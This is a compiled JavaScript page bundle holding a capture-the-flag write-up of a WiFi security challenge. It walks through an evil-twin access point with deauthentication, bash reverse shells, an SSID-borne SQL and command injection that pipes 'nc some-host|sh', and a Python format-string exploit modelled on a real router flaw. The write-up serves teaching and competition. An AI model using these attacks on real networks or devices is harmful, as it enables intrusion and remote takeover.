"use strict";(self.webpackChunkspr_docs=self.webpackChunkspr_docs||[]).push([[7480],{77856:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>d,frontMatter:()=>r,metadata:()=>o,toc:()=>c});var s=t(85893),a=t(11151);const r={slug:"january-2023-turtles",title:"January 2023's Turtles Challenge",authors:"Amy",tags:["Turtles","CTF","Hacking","WiFi","EvilTwin","Deauthentication"]},i=void 0,o={permalink:"/pages/blog/january-2023-turtles",source:"@site/blog/2023-02-15-turtles-jan.md",title:"January 2023's Turtles Challenge",description:"Editor's note:",date:"2023-02-15T00:00:00.000Z",formattedDate:"February 15, 2023",tags:[{label:"Turtles",permalink:"/pages/blog/tags/turtles"},{label:"CTF",permalink:"/pages/blog/tags/ctf"},{label:"Hacking",permalink:"/pages/blog/tags/hacking"},{label:"WiFi",permalink:"/pages/blog/tags/wi-fi"},{label:"EvilTwin",permalink:"/pages/blog/tags/evil-twin"},{label:"Deauthentication",permalink:"/pages/blog/tags/deauthentication"}],readingTime:8.745,hasTruncateMarker:!1,authors:[{name:"Amy",url:"https://twitter.com/itszn13",key:"Amy"}],frontMatter:{slug:"january-2023-turtles",title:"January 2023's Turtles Challenge",authors:"Amy",tags:["Turtles","CTF","Hacking","WiFi","EvilTwin","Deauthentication"]},unlisted:!1,prevItem:{title:"March 2023's Turtles Challenge",permalink:"/pages/blog/spr-turtles-march"},nextItem:{title:"Run Virtual SPR on a Google Cloud Free Tier Instance",permalink:"/pages/blog/virtual-spr-on-a-gcloud-tier-free-instance"}},l={authorsImageUrls:[void 0]},c=[{value:"Editor&#39;s note:",id:"editors-note",level:4},{value:"Intro",id:"intro",level:2},{value:"Flag 1",id:"flag-1",level:2},{value:"Flag 2",id:"flag-2",level:2},{value:"Flag 3",id:"flag-3",level:2},{value:"Editor&#39;s note:",id:"editors-note-1",level:4}];function h(e){const n={a:"a",code:"code",h2:"h2",h4:"h4",img:"img",p:"p",pre:"pre",...(0,a.a)(),...e.components};return(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h4,{id:"editors-note",children:"Editor's note:"}),"\n",(0,s.jsxs)(n.p,{children:["The Turtles WiFi challenges are a series of ctf-style problems concerning network and wifi security skills.\nWe first ran a challenge in this style at ",(0,s.jsx)(n.a,{href:"https://github.com/spr-networks/turtles-midnightsunctf-2022-finals",children:"Stockholm's Midnight Sun CTF Finals in August '22 at the Turtles MidnightSun Finals"}),". You can play along with January's challenge, with the ",(0,s.jsx)(n.a,{href:"https://github.com/spr-networks/turtles-january-23",children:"github repository"}),"."]}),"\n",(0,s.jsxs)(n.p,{children:["January's winner, ",(0,s.jsx)(n.a,{href:"https://twitter.com/itszn13",children:"Amy"})," from ",(0,s.jsx)(n.a,{href:"https://ret2.io/",children:"Ret2 Systems"}),", has kindly let us share their challenge writeup. Congratulations! And thanks again for putting this writeup together."]}),"\n",(0,s.jsx)(n.p,{children:"February's contest will be released on the 20th and we will be giving out more raspberry pis!"}),"\n",(0,s.jsx)(n.h2,{id:"intro",children:"Intro"}),"\n",(0,s.jsx)(n.p,{children:'We find ourselves in a twisting maze of WLANs. There are 5 machines connected across several WLAN networks. We start as root on the first machine and must move laterally across the network to exfiltrate 3 flag files.  From our box we can connect to an access point with the SSID "jan-turtle1".'}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.img,{src:t(43419).Z+"",width:"1503",height:"633"})}),"\n",(0,s.jsx)(n.h2,{id:"flag-1",children:"Flag 1"}),"\n",(0,s.jsxs)(n.p,{children:['Our first target is also connected to the "jan-turtle1" AP over WPA3. We can assume that the target may be doing something interesting over this network, so performing a MitM attack may be fruitful. To pull this off we can use the so-called ',(0,s.jsx)(n.a,{href:"https://en.wikipedia.org/wiki/Evil_twin_(wireless_networks)",children:'"Evil Twin Attack"'})," where we impersonate the AP."]}),"\n",(0,s.jsxs)(n.p,{children:['First we need to set up our own AP with the same SSID and configuration as the existing "jan-turtle1" AP. I used ',(0,s.jsx)(n.code,{children:"hostapd"})," to do this with the following config:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"interface=wlan2\ndriver=nl80211\nhw_mode=a\nchannel=40\nssid=jan-turtle1\nwpa=2\nwpa_key_mgmt=SAE\nwpa_pairwise=CCMP\nap_isolate=1\nsae_password=sn0wt0rt0ise\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"ip addr add dev wlan2 192.168.1.1/24\nhostapd -B /root/h.conf\n"})}),"\n",(0,s.jsx)(n.p,{children:'Once we have the AP up and running, clients looking for the real "jan-turtle1" AP may connect to our malicious AP instead. However the target is already connected to the existing AP, so it won\'t attempt to reconnect to our AP.'}),"\n",(0,s.jsxs)(n.p,{children:["Luckily we can force it off of the original AP by abusing ",(0,s.jsx)(n.a,{href:"https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack",children:"deauthentication packets"}),". If we send these packets with a spoofed target address, we cause the target to disconnect. Once the client has disconnected, there is a chance that they will reconnect to our malicious access point. We can use ",(0,s.jsx)(n.a,{href:"https://www.aircrack-ng.org/doku.php?id=aireplay-ng",children:(0,s.jsx)(n.code,{children:"aireplay-ng"})})," to perform this attack on a second WLAN:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"ip link set dev wlan3 up\nyes | airmon-ng start wlan3 40\n# Start deauth on target MAC\naireplay-ng -0 10 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan3mon &\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"# tcpdump -i wlan2 -v\n06:09:53  Waiting for beacon frame (BSSID: 02:00:00:00:00:00) on channel 40\n06:09:53  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00\ntcpdump: listening on wlan2, link-type EN10MB (Ethernet), snapshot length 262144 bytes\n06:10:01.225272 02:00:00:00:01:00 (oui Unknown) > Broadcast Null Unnumbered, xid, Flags [Response], length 6: 01 00\n06:10:08.879191 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 192.168.1.1 tell 192.168.1.2, length 28\n06:10:08.879228 ARP, Ethernet (len 6), IPv4 (len 4), Reply 192.168.1.1 is-at 02:00:00:00:02:00 (oui Unknown), length 28\n08:35:14.868587 IP (tos 0x0, ttl 64, id 18623, offset 0, flags [DF], proto TCP (6), length 60)\n    192.168.1.2.49070 > 192.168.1.1.http: Flags [S], cksum 0x27e2 (correct), seq 547073709, win 64240, options [mss 1460,sackOK,TS val 3350547164 ecr 0,nop,wscale 7], length 0\n06:10:08.879473 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 40)\n    192.168.1.1.http > 192.168.1.2.49070: Flags [R.], cksum 0x9d34 (correct), seq 0, ack 547073710, win 0, length 0\n"})}),"\n",(0,s.jsx)(n.p,{children:"Looks like there is a unencrypted HTTP request! Lets host our own http server using python:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:'# python3 -m http.server 80\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/)\n192.168.1.2 - - [15/Feb/2023 06:17:06] "GET /install.sh HTTP/1.1" 404 -\n192.168.1.2 - - [15/Feb/2023 06:17:16] code 404, message File not found\n'})}),"\n",(0,s.jsxs)(n.p,{children:["If we create our own ",(0,s.jsx)(n.code,{children:"install.sh"}),", it looks like the box will run it! Lets get a reverse shell"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"bash -i >& /dev/tcp/192.168.1.1/1337 0>&1\n"})}),"\n",(0,s.jsx)(n.p,{children:"Nice, we captured the first flag!"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"Listening on 0.0.0.0 1337\nConnection received on 192.168.1.2 47550\nbash: cannot set terminal process group (8): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@2d419af9c243:/# cat flag1.txt\nturtles{0f004d8e004f4577952eda915426eac38f4df6b4}\nroot@2d419af9c243:/#\n"})}),"\n",(0,s.jsx)(n.h2,{id:"flag-2",children:"Flag 2"}),"\n",(0,s.jsxs)(n.p,{children:["For the second stage, we are given a binary named ",(0,s.jsx)(n.a,{href:"https://en.wikipedia.org/wiki/Wardriving",children:(0,s.jsx)(n.code,{children:"wardriver"})})," which is running on the second target. This binary has two main features. First it used ",(0,s.jsx)(n.code,{children:"iw dev <dev> scan"})," to collect information on all near by access points."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:'int getData() {\n  __snprintf_chk(command, 256LL, 1LL, 256LL, "iw dev %s scan", (const char *)IFACE);\n  if ( fopen("scan.txt", "r") )\n    strcpy(command, "cat scan.txt");\n  v0 = popen(command, "r");\n  insert(v0);\n  ...\n  sqlite3_exec(v7, v8, 0LL, 0LL);\n}\n__int64 __fastcall insert(...) {\n  ...\n  __snprintf_chk(\n        v8, 256LL, 1LL, 256LL,\n        "INSERT INTO wifis VALUES(%d, \'%s\', \'%s\', \'%s\');",\n        _id, bss_str, ssid_str, signal_str,\n    );\n}\n'})}),"\n",(0,s.jsxs)(n.p,{children:["If we create an malicious AP, the SSID will be formatted into this INSERT command. We can use this to perform an SQL insert injection into the database, allowing us to control any field of a new entry to the ",(0,s.jsx)(n.code,{children:"wifis"})," table."]}),"\n",(0,s.jsx)(n.p,{children:"Next we look at the second functionality. The binary will periodically dump values from the table and send them as data using a curl command:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:'__int64 dump() {\n  ...\n  v0 = sqlite3_exec(v3, "SELECT * FROM wifis", callback, 0LL);\n  ...\n}\n__int64 __fastcall callback(...) {\n...\n  if ( bss_str && signal_str ) {\n    __snprintf_chk(\n      command, 128LL, 1LL, 128LL,\n      "curl %s --data \\"{\\\\\\"bss\\\\\\": \\\\\\"%s\\\\\\", \\\\\\"signal\\\\\\": \\\\\\"%s\\\\\\"}\\"",\n      "http://127.0.0.1:8080/logs",\n      bss_str, signal_str);\n    system(command);\n    return 0LL;\n  }\n  return 1LL;\n}\n'})}),"\n",(0,s.jsxs)(n.p,{children:["We can see that there is no sanitization of the ",(0,s.jsx)(n.code,{children:"bss"})," or ",(0,s.jsx)(n.code,{children:"signal"})," columns when formatted into the command. We can trigger command injection here by creating a malicious wifi entry using the SQL injection in the previous function. The length of command injection in the SSID is limited, so I fetched a second stage from a remote host. Here is the ",(0,s.jsx)(n.code,{children:"hostapd"})," config with the SQL injection payload:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-sql",children:"interface=wlan4\ndriver=nl80211\nhw_mode=a\nchannel=48\nssid=',''),(2,'`nc some-host 9|sh`','\nwpa=2\nwpa_key_mgmt=SAE\nwpa_pairwise=CCMP\nap_isolate=1\nsae_password=shred_the_gnar_pow\n"})}),"\n",(0,s.jsx)(n.p,{children:"After a few seconds the wardriver picks up our AP and we get a connect back on the second target!"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"$ nc -l 1338 -v\nListening on 0.0.0.0 1338\nConnection received on 192.168.1.2 58580\nbash: cannot set terminal process group (8): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@b976e8a2f52b:/# cat flag2.txt\ncat flag2.txt\nturtles{f0c03d9e242a89f1df51e5da9a833750398fe989}\nroot@b976e8a2f52b:/#\n"})}),"\n",(0,s.jsx)(n.h2,{id:"flag-3",children:"Flag 3"}),"\n",(0,s.jsx)(n.p,{children:"For the final target, we need to exploit an SOAP Server running on the second AP. Our second target box is already authenticated to the AP, so we can easily talk to the server directly."}),"\n",(0,s.jsxs)(n.p,{children:["Decompiling the binary, we see that it is a simple HTTP server which implements a few parts of the ",(0,s.jsx)(n.a,{href:"https://en.wikipedia.org/wiki/SOAP",children:"SOAP protocol"}),". We can perform a some actions such as listing the server uptime or date."]}),"\n",(0,s.jsxs)(n.p,{children:["The first bug I found was in an error handler. This handler uses the ",(0,s.jsx)(n.code,{children:"http_response"})," function to build a response with HTTP code 400. However for the body pointer, it mistakenly passes a ",(0,s.jsx)(n.code,{children:"void**"})," pointer instead of a ",(0,s.jsx)(n.code,{children:"char*"})," ptr. This will leak the address of the ",(0,s.jsx)(n.code,{children:"soap_action"})," function as well as a stack address in the body of the 400 response."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:'int __cdecl http_response(...) {\n  fprintf(stream, "HTTP/1.1 %d %s\\r\\n", a2, a3);\n  fwrite("Server: OS/Version UPnP/1.0 product/version", 1u, 0x2Bu, stream);\n  fwrite("Content-Type: text/html\\r\\n", 1u, 0x19u, stream);\n  fwrite("Connection: close\\r\\n", 1u, 0x13u, stream);\n  fwrite("\\r\\n", 1u, 2u, stream);\n  fprintf(stream, "<HTML><HEAD><TITLE>%d %s</TITLE></HEAD>\\n<H4>%d %s</H4>\\n", a2, a3, a2, a3);\n  ...\n}\nunsigned int __cdecl handle_client(int fd) {\n  void* __soap_action_ = soap_action;\n  char *v7;\n  char buf[2048];\n  v7 = &buf;\n  if ( _isoc99_sscanf(...) ) {\n    ...\n    __soap_action(steam);\n  } else {\n    http_response(stream, 400, "Invalid request", (const char *)&__soap_action_)\n  }\n}\n'})}),"\n",(0,s.jsx)(n.p,{children:"We can trigger this leak with the following code:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect((HOST, PORT))\n\nsock.sendall(b'ENDEND a\\n')\nleak = (sock.recv(4096).split(b'request</H4>\\n',1)[1]\n\t\t.split(b'ENDEND',1)[0].ljust(8,b'\\0'))\ntext_leak = u32(leak[:4])\nstack_leak = u32(leak[4:])\n\nsock.close()\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Looking closer at the string functions being used, there are several buffer overflows from calls to ",(0,s.jsx)(n.code,{children:"sprintf"})," and ",(0,s.jsx)(n.code,{children:"strcpy"}),". However almost all of these are protected by stack-cookies. Luckily there is a single case where a pointer lays between a buffer and the stack-cookie:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-c",children:'__int64 __cdecl soap_response(...) {\n  char dest[2048];\n  char src[2048];\n  char* format_str;\n  unsigned int cookie;\n  ...\n  format_str = "%s";\n  ...\n  sprintf(&src[off], "%s", sub_action);\n  ...\n  sprintf(&src[off], format_str, action);\n}\n'})}),"\n",(0,s.jsxs)(n.p,{children:["Since we are able to buffer overflow ",(0,s.jsx)(n.code,{children:"src"})," using the first ",(0,s.jsx)(n.code,{children:"sprintf"})," call, we can smash the ",(0,s.jsx)(n.code,{children:"format_str"})," ptr. This allows point ",(0,s.jsx)(n.code,{children:"format_str"})," at our own data on the stack (using the leak from earlier), giving us an arbitrary ",(0,s.jsx)(n.a,{href:"https://en.wikipedia.org/wiki/Uncontrolled_format_string",children:"format string vulnerability"}),"."]}),"\n",(0,s.jsxs)(n.p,{children:["We can easily exploit the format string by using the ",(0,s.jsx)(n.code,{children:"%123$hhn"})," syntax. This syntax will write the number of bytes printed so far as a ",(0,s.jsx)(n.code,{children:"uint8_t"})," at a given offset on the stack. This is very handy as we can use it to surgically corrupt a return pointer without messing with the stack-cookie."]}),"\n",(0,s.jsxs)(n.p,{children:["At this point we can control the EIP register, but we still need to actually get code execution. There is an easy way to do this by abusing the calls to ",(0,s.jsx)(n.code,{children:"system"})," in the binary. We can partially corrupt the return address to point it to the following address in the binary:"]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:".text:00001A76                 call    system\n.text:00001A7B                 add     esp, 10h\n.text:00001A7E                 sub     esp, 8\n"})}),"\n",(0,s.jsx)(n.p,{children:"The first argument of system will be the next value pointed to by ESP, which just so happens to be our format string from before. We can simply prepend our format string exploit with a command to run!"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"# Prep return byte overwrite targets\ng1 = 0x76\ng2 = ((text_leak & 0xf000) >> 8) + 0xa\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nsock.connect((HOST, PORT))\n\npl = b'post / a\\nSOAPAction: '\npl += b'numberwang#wangernum42'\n\n# Place write targets on the stack\npl += p32(target_stack_ret)\npl += p32(target_stack_ret+1)\n# Padding\npl += b'EEEE'\npl += b'FFFF'\npl += b'A'*(1824-4*4)\n# Smash format ptr\npl += p32(stack_leak)\npl += b'\\n\\n'\n\n# Command to run in system\nfmt = 'nc some-host 10|sh;#'\n\n# Format string exploit\nfmt +=  f'%{g1-len(fmt)}c'+'%592$hhn'+f'%{g2-g1}c'+'%593$hhn'\npl += fmt.encode('latin-1')\n\nsock.sendall(pl)\n"})}),"\n",(0,s.jsx)(n.p,{children:"With this exploit ready to go, we can run it from the second target box. Once the exploit lands we are greeted with our last reverse shell and get the last flag!"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"$ nc -l 1339 -v\nListening on 0.0.0.0 1339\nConnection received on 192.168.1.2 14253\nbash: cannot set terminal process group (8): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@21fbbf871fa0:/# cat flag3.txt\nturtles{c14583540ce6a34f73cb04d964aff18415916fae}\nroot@21fbbf871fa0:/#\n"})}),"\n",(0,s.jsx)(n.h4,{id:"editors-note-1",children:"Editor's note:"}),"\n",(0,s.jsx)(n.p,{children:"Challenge 3 is based on a flaw the Supernetworks team exploited in preparation for December's pwn2own contest against the Netgear RAX30. Oddly enough: the soapd binary has FORTIFY_SOURCE enabled, yet still has some stray sprintfs, and does in fact store the format string on the stack like that, for unclear reasons."})]})}function d(e={}){const{wrapper:n}={...(0,a.a)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(h,{...e})}):h(e)}},43419:(e,n,t)=>{t.d(n,{Z:()=>s});const s=t.p+"assets/images/xturtles_jan-214c65df625b66cd8d02e9bc7317fc87.png"},11151:(e,n,t)=>{t.d(n,{Z:()=>o,a:()=>i});var s=t(67294);const a={},r=s.createContext(a);function i(e){const n=s.useContext(r);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:i(e.components),s.createElement(r.Provider,{value:n},e.children)}}}]);